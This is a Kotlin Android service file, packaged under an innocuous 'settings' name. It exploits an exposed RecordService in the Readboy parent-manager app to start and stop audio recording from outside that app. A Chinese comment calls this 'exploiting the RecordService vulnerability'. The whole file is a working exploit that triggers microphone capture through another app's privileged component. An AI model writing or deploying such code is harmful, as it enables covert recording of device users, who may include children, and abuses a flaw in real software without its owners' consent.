package com.zaralyn.settings.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log

class RecordService : Service() {
    
    companion object {
        private const val TAG = "Record"
    }
    
    private var isRecording = false
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.action?.let { action ->
            when (action) {
                "START_RECORD" -> startRecord()
                "STOP_RECORD" -> stopRecord()
            }
        }
        return START_STICKY
    }
    
    private fun startRecord() {
        if (isRecording) return
        
        try {
            // 利用 RecordService 漏洞
            val recordIntent = Intent().apply {
                setClassName("com.readboy.parentmanager", "com.readboy.parentmanager.client.service.RecordService")
                action = "START_RECORD"
            }
            startService(recordIntent)
            isRecording = true
            Log.d(TAG, "开始录音")
        } catch (e: Exception) {
            Log.e(TAG, "录音失败", e)
        }
    }
    
    private fun stopRecord() {
        if (!isRecording) return
        
        try {
            val recordIntent = Intent().apply {
                setClassName("com.readboy.parentmanager", "com.readboy.parentmanager.client.service.RecordService")
                action = "STOP_RECORD"
            }
            startService(recordIntent)
            isRecording = false
            Log.d(TAG, "停止录音")
        } catch (e: Exception) {
            Log.e(TAG, "停止录音失败", e)
        }
    }
}